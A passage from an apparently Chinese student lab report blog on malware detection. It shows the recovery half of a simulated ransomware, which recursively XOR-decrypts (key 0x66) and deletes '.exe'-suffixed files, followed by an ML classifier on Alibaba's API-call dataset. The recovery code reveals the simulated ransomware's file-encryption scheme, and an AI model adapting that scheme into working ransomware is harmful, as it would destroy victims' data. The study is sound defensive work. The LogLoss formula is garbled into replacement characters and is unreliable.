printf(&quot;Oh, ho, all file recovered！\n&quot;);</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  <code>decode-funcs.cpp</code>：</p>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">#include&quot;funcs.h&quot;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">void findFile(char* pathName) &#123;</span><br><span class="line">    char currFile[MAX_PATH]; // 暂时存储每个文件名</span><br><span class="line">    memset(currFile, 0, MAX_PATH);</span><br><span class="line">    sprintf(currFile, &quot;%s\\*.*&quot;, pathName);</span><br><span class="line">    _WIN32_FIND_DATAA findData;</span><br><span class="line">    HANDLE hFile = FindFirstFile(currFile, &amp;findData);</span><br><span class="line">    if (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    int ret = 0;</span><br><span class="line">    while (1) &#123;</span><br><span class="line">        memset(currFile, 0, MAX_PATH);</span><br><span class="line">        sprintf(currFile, &quot;%s\\%s&quot;, pathName, findData.cFileName);</span><br><span class="line">        // 检查文件属性--文件还是文件夹？</span><br><span class="line">        if (findData.cFileName[0] == &#x27;.&#x27;); //对特殊文件夹不进行处理</span><br><span class="line">        else if ((findData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY))  //如果是普通文件夹，递归调用findFile函数</span><br><span class="line">            findFile(currFile);</span><br><span class="line">        else //否则，处理当前文件(安全起见这里仅打印文件名)</span><br><span class="line">            deCode(currFile);</span><br><span class="line"></span><br><span class="line">        ret = FindNextFile(hFile, &amp;findData);</span><br><span class="line">        if (!ret)</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void deCode(char* pathFile) &#123;</span><br><span class="line">    //打开待解密文件，创建解密后文件</span><br><span class="line">    FILE* fpSrc = fopen(pathFile, &quot;rb&quot;); //只读字节流</span><br><span class="line">    char buff[MAX_PATH];</span><br><span class="line">    memset(buff, 0, MAX_PATH);</span><br><span class="line">    //去掉.exe后缀</span><br><span class="line">    if (dropEXE(pathFile, buff) != 0) //如果返回非0，则说明当前文件非.exe结尾，不进行解密处理</span><br><span class="line">        return;</span><br><span class="line">    FILE* fpDst = fopen(buff, &quot;wb&quot;); //只写字节流</span><br><span class="line">    if (fpSrc == NULL || fpDst == NULL)</span><br><span class="line">        return;</span><br><span class="line">    //以单个字节循环读取待解密文件内容，并写入解密文件中</span><br><span class="line">    char currByte;</span><br><span class="line">    while (1) &#123;</span><br><span class="line">        int count = fread(&amp;currByte, 1, 1, fpSrc);</span><br><span class="line">        if (count &lt; 1) //没读到</span><br><span class="line">            break;</span><br><span class="line">        currByte ^= 0x66; //简单异或解密法</span><br><span class="line">        fwrite(&amp;currByte, 1, 1, fpDst); //写入解密文件</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fpSrc);</span><br><span class="line">    fclose(fpDst);</span><br><span class="line">    printf(&quot;Congrat! %s recoveried successfully!\n&quot;, buff);</span><br><span class="line">    remove(pathFile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int dropEXE(char* fpSrc, char* fpDst) &#123;</span><br><span class="line">    int n = strlen(fpSrc);</span><br><span class="line">    if (n &lt; 4)</span><br><span class="line">        return 1;</span><br><span class="line">    char check[5];</span><br><span class="line">    for (int i = 0; i &lt; 4; ++i)</span><br><span class="line">        check[i] = *(fpSrc + n - 4 + i);</span><br><span class="line">    check[4] = &#x27;\0&#x27;;</span><br><span class="line">    if (strcmp(check, &quot;.exe&quot;) != 0) &#123;</span><br><span class="line">        printf(&quot;sorry, %s is not a .exe file, recovery failed!\n&quot;, fpSrc);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    strncpy(fpDst, fpSrc, n - 4);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  <code>decode-funcs.h</code>：</p>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#pragma once</span><br><span class="line">#pragma warning(disable : 4996)</span><br><span class="line"></span><br><span class="line">// 在指定路径下递归寻找所有文件</span><br><span class="line">void findFile(char* pathName);</span><br><span class="line"></span><br><span class="line">// 解密操作</span><br><span class="line">void deCode(char* pathFile);</span><br><span class="line">int dropEXE(char* fpSrc, char* fpDst);</span><br></pre></td></tr></table></figure>
  <img src="/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241213000517248.png" class="" title="image-20241213000517248">
  <img src="/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241213000536557.png" class="" title="image-20241213000536557">
  <img src="/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241213000633707.png" class="" title="image-20241213000633707">
<h4 id="第二部分：基于机器学习的恶意程序检测"><a href="#第二部分：基于机器学习的恶意程序检测" class="headerlink" title="第二部分：基于机器学习的恶意程序检测"></a>第二部分：基于机器学习的恶意程序检测</h4><p>恶意软件是一种被设计用来对目标计算机造成破坏或占用目标计算机资源的软件，包括蠕虫、木马、勒索病毒等。近年来，随着虚拟货币的流行，挖矿类恶意程序也大规模出现，严重侵害用户利益。通过结合机器学习和深度学习技术，能够有效提高恶意程序的检测率和泛化能力。</p>
<p>本实验以<a target="_blank" rel="noopener" href="https://tianchi.aliyun.com/competition/entrance/231694/information">阿里云安全恶意程序检测竞赛</a>提供的恶意程序检测数据集为基础，探索恶意程序检测的多种方法，包括：</p>
<ol>
<li>模拟勒索病毒行为。</li>
<li>基于机器学习的恶意程序检测。</li>
<li>基于深度学习的恶意程序分类。</li>
</ol>
<h5 id="数据集介绍："><a href="#数据集介绍：" class="headerlink" title="数据集介绍："></a>数据集介绍：</h5><p>阿里云安全恶意程序检测数据集 (<a target="_blank" rel="noopener" href="https://tianchi.aliyun.com/dataset/137262">阿里云数据集</a>)</p>
<p>本次实验使用的数据集由阿里云提供，包含从沙箱模拟运行后的Windows可执行程序API调用序列。数据总计约6亿条，包括多种恶意程序类型和正常文件的数据。数据集主要特点和内容如下：</p>
<h6 id="1-数据结构"><a href="#1-数据结构" class="headerlink" title="1. 数据结构"></a><strong>1. 数据结构</strong></h6><div class="table-container">
<table>
<thead>
<tr>
<th>字段名称</th>
<th>数据类型</th>
<th style="text-align:left">解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>file_id</code></td>
<td><code>bigint</code></td>
<td style="text-align:left">文件编号</td>
</tr>
<tr>
<td><code>label</code></td>
<td><code>bigint</code></td>
<td style="text-align:left">文件标签：0（正常）、1（勒索病毒）、2（挖矿程序）、3（DDoS木马）、4（蠕虫病毒）、5（感染型病毒）、6（后门程序）、7（木马程序）</td>
</tr>
<tr>
<td><code>api</code></td>
<td><code>string</code></td>
<td style="text-align:left">文件调用的API名称</td>
</tr>
<tr>
<td><code>tid</code></td>
<td><code>bigint</code></td>
<td style="text-align:left">调用API的线程编号</td>
</tr>
<tr>
<td><code>return_value</code></td>
<td><code>string</code></td>
<td style="text-align:left">API返回值</td>
</tr>
<tr>
<td><code>index</code></td>
<td><code>string</code></td>
<td style="text-align:left">API调用的顺序编号，在同线程中保证顺序，但不同线程之间无顺序关系</td>
</tr>
</tbody>
</table>
</div>
<h6 id="2-数据规模"><a href="#2-数据规模" class="headerlink" title="2. 数据规模"></a><strong>2. 数据规模</strong></h6><ul>
<li>训练数据：约9000万次调用，文件1万多个（以文件编号汇总）。</li>
<li>测试数据：约8000万次调用，包含约1万个文件。</li>
<li>每个文件中的API调用可能超过5000条，超出部分已截断。</li>
</ul>
<h6 id="3-数据预处理"><a href="#3-数据预处理" class="headerlink" title="3. 数据预处理"></a><strong>3. 数据预处理</strong></h6><ul>
<li>数据均已脱敏，确保隐私和安全。</li>
<li>每条记录包含完整的调用上下文及线程信息，有助于模型捕获程序行为特征。</li>
</ul>
<h6 id="4-评测指标"><a href="#4-评测指标" class="headerlink" title="4. 评测指标"></a><strong>4. 评测指标</strong></h6><p>使用LogLoss（对数损失）作为评测指标：</p>
<p>logloss=−1�∑�=1�∑�=1�[���log⁡(���)+(1−���)log⁡(1−���)]</p>
<p>其中：</p>
<ul>
<li><strong>�</strong>：表示分类数（总共6个类别）。</li>
<li><strong>�</strong>：表示测试集样本总数。</li>
<li><strong>���</strong>：第�个样本是否属于第�类（是-1，否-0）。</li>
<li><strong>���</strong>：第�个样本被预测为第�类的概率（如：prob0, prob1, prob2, prob3, prob4, prob5 ,prob6,prob7）。</li>
</ul>
<h5 id="实验方法"><a href="#实验方法" class="headerlink" title="实验方法"></a><strong>实验方法</strong></h5><ol>
<li>特征提取：<ul>
<li>将恶意软件的数据格式化，主要包括API调用序列、线程信息等。</li>
<li>统一数据的API字段编码，使用LabelEncoder为API字段生成整数值，便于模型处理。</li>
<li>对API调用序列长度进行填充/截断（最大长度设为5000）。</li>
<li>基于TF-IDF对API调用文本进行特征提取。</li>
</ul>
</li>
<li>模型训练：<ul>
<li>使用TF-IDF提取特征，结合LightGBM分类模型。</li>
<li>TF-IDF使用一元和二元词组，特征数量限制为1000。</li>
<li>使用5折交叉验证评估模型性能。</li>
</ul>
</li>
</ol>
<h5 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a><strong>实验结果</strong></h5><ol>
<li>代码实现：<ul>
<li>特征提取：基于TF-IDF的API序列向量化。</li>
<li>模型训练：使用LightGBM进行多分类任务。</li>
</ul>
</li>
<li>性能表现：<ul>
<li>平均验证集准确率：<strong>90.24%</strong>。</li>
<li>每折交叉验证的准确率分布：<ul>
<li>折1：90.82%</li>
<li>折2：89.67%</li>
<li>折3：90.49%</li>
<li>折4：89.41%</li>
<li>折5：90.78%</li>
</ul>
</li>
</ul>
</li>
<li>特征贡献：<ul>
<li>TF-IDF特征对模型贡献显著，尤其是高频API组合。线程相关统计特征如调用次数、API分布等也显著提升了分类效果。</li>
</ul>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">PS D:\chen_hao\病毒检测机器学习&gt; &amp; D:/ProgramSoftware/anaconda3/python.exe d:/chen_hao/病毒检测机器学习/TF-IDF_LightGBM.py</span><br><span class="line">检查GPU状态...</span><br><span class="line">GPU 检查失败，将使用 CPU 模式: module &#x27;lightgbm&#x27; has no attribute &#x27;get_gpu_device_count&#x27;</span><br><span class="line">读取训练数据...</span><br><span class="line">读取测试数据...</span><br><span class="line">训练数据形状: (89806693, 5)</span><br><span class="line">测试数据形状: (79288375, 4)</span><br><span class="line">准备训练数据...</span><br><span class="line">编码标签...</span><br><span class="line">原始标签分布:</span><br><span class="line">label</span><br><span class="line">5    33033543</span><br><span class="line">0    16375107</span><br><span class="line">7    15081535</span><br><span class="line">2     9693969</span><br><span class="line">3     8117585</span><br><span class="line">6     4586578</span><br><span class="line">1     2254561</span><br><span class="line">4      663815</span><br><span class="line">Name: count, dtype: int64</span><br><span class="line">标签映射:</span><br><span class="line">&#123;0: 0, 1: 1, 2: 2, 3: 3, 4: 4, 5: 5, 6: 6, 7: 7&#125;</span><br><span class="line">提取基础统计特征...</span><br><span class="line">计算基础聚合特征...</span><br><span class="line">计算API序列特征...</span><br><span class="line">计算线程特征...</span><br><span class="line">提取TF-IDF特征...</span><br><span class="line">准备API序列...</span><br><span class="line">训练TF-IDF向量化器...</span><br><span class="line">开始5折交叉验证训练...</span><br><span class="line"></span><br><span class="line">训练折数 1/5</span><br><span class="line">Training until validation scores don&#x27;t improve for 50 rounds</span><br><span class="line">[100]   valid_0&#x27;s multi_logloss: 0.267747</span><br><span class="line">Early stopping, best iteration is:</span><br><span class="line">[103]   valid_0&#x27;s multi_logloss: 0.267092</span><br><span class="line">Fold 1 验证集准确率: 0.9082</span><br><span class="line"></span><br><span class="line">训练折数 2/5</span><br><span class="line">Training until validation scores don&#x27;t improve for 50 rounds</span><br><span class="line">[100]   valid_0&#x27;s multi_logloss: 0.315787</span><br><span class="line">Early stopping, best iteration is:</span><br><span class="line">[93]    valid_0&#x27;s multi_logloss: 0.314403</span><br><span class="line">Fold 2 验证集准确率: 0.8967</span><br><span class="line"></span><br><span class="line">训练折数 3/5</span><br><span class="line">Training until validation scores don&#x27;t improve for 50 rounds</span><br><span class="line">[100]   valid_0&#x27;s multi_logloss: 0.299846</span><br><span class="line">Early stopping, best iteration is:</span><br><span class="line">[88]    valid_0&#x27;s multi_logloss: 0.298147</span><br><span class="line">Fold 3 验证集准确率: 0.9049</span><br><span class="line"></span><br><span class="line">训练折数 4/5</span><br><span class="line">Training until validation scores don&#x27;t improve for 50 rounds</span><br><span class="line">[100]   valid_0&#x27;s multi_logloss: 0.331149</span><br><span class="line">Early stopping, best iteration is:</span><br><span class="line">[83]    valid_0&#x27;s multi_logloss: 0.328906</span><br><span class="line">Fold 4 验证集准确率: 0.8941</span><br><span class="line"></span><br><span class="line">训练折数 5/5</span><br><span class="line">Training until validation scores don&#x27;t improve for 50 rounds</span><br><span class="line">[100]   valid_0&#x27;s multi_logloss: 0.292818</span><br><span class="line">Early stopping, best iteration is:</span><br><span class="line">[95]    valid_0&#x27;s multi_logloss: 0.291777</span><br><span class="line">Fold 5 验证集准确率: 0.9078</span><br><span class="line"></span><br><span class="line">平均验证集准确率: 0.9024</span><br><span class="line">生成预测结果...</span><br><span class="line">准备测试数据...</span><br><span class="line">编码标签...</span><br><span class="line">提取基础统计特征...</span><br><span class="line">计算基础聚合特征...</span><br><span class="line">计算API序列特征...</span><br><span class="line">计算线程特征...</span><br><span class="line">提取TF-IDF特征...</span><br><span class="line">准备API序列...</span><br><span class="line">生成预测...</span><br><span class="line">保存预测结果...</span><br><span class="line">完成!</span><br></pre></td></tr></table></figure>
<img src="/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241212110923814.png" class="" title="image-20241212110923814">
<img src="/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241212110951238.png" class="" title="image-20241212110951238">
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line">from sklearn.metrics import accuracy_score</span><br><span class="line">from sklearn.feature_extraction.text import TfidfVectorizer</span><br><span class="line">from sklearn.model_selection import train_test_split, StratifiedKFold</span><br><span class="line">import lightgbm as lgb</span><br><span class="line">import warnings</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(&#x27;ignore&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check_gpu():</span><br><span class="line">    &quot;&quot;&quot;检查GPU是否可用&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        lgb_version = lgb.__version__</span><br><span class="line">        is_gpu_available = lgb.get_gpu_device_count() &gt; 0</span><br><span class="line">        print(f&quot;LightGBM 版本: &#123;lgb_version&#125;&quot;)</span><br><span class="line">        print(f&quot;GPU 可用: &#123;is_gpu_available&#125;&quot;)</span><br><span class="line">        if is_gpu_available:</span><br><span class="line">            print(f&quot;可用 GPU 数量: &#123;lgb.get_gpu_device_count()&#125;&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;GPU 检查失败，将使用 CPU 模式: &#123;e&#125;&quot;)</span><br><span class="line">        return False</span><br><span class="line">    return is_gpu_available</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def optimize_dtypes(df):</span><br><span class="line">    &quot;&quot;&quot;优化数据类型以减少内存使用&quot;&quot;&quot;</span><br><span class="line">    for col in df.columns:</span><br><span class="line">        if df[col].dtype == &#x27;float64&#x27;:</span><br><span class="line">            df[col] = df[col].astype(&#x27;float32&#x27;)</span><br><span class="line">        elif df[col].dtype == &#x27;int64&#x27;:</span><br><span class="line">            df[col] = df[col].astype(&#x27;int32&#x27;)</span><br><span class="line">    return df</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MalwareClassifier:</span><br><span class="line">    def __init__(self, use_gpu=True):</span><br><span class="line">        self.tfidf = None</span><br><span class="line">        self.models = None</span><br><span class="line">        self.feature_importances = None</span><br><span class="line">        self.use_gpu = use_gpu</span><br><span class="line">        self.label_map = None</span><br><span class="line"></span><br><span class="line">    def _encode_labels(self, train_data=None, test_data=None):</span><br><span class="line">        &quot;&quot;&quot;标签编码&quot;&quot;&quot;</span><br><span class="line">        if train_data is not None and &#x27;label&#x27; in train_data.columns:</span><br><span class="line">            print(&quot;原始标签分布:&quot;)</span><br><span class="line">            print(train_data[&#x27;label&#x27;].value_counts())</span><br><span class="line">            unique_labels = sorted(train_data[&#x27;label&#x27;].unique())</span><br><span class="line">            self.label_map = &#123;label: idx for idx, label in enumerate(unique_labels)&#125;</span><br><span class="line">            print(&quot;标签映射:&quot;)</span><br><span class="line">            print(self.label_map)</span><br><span 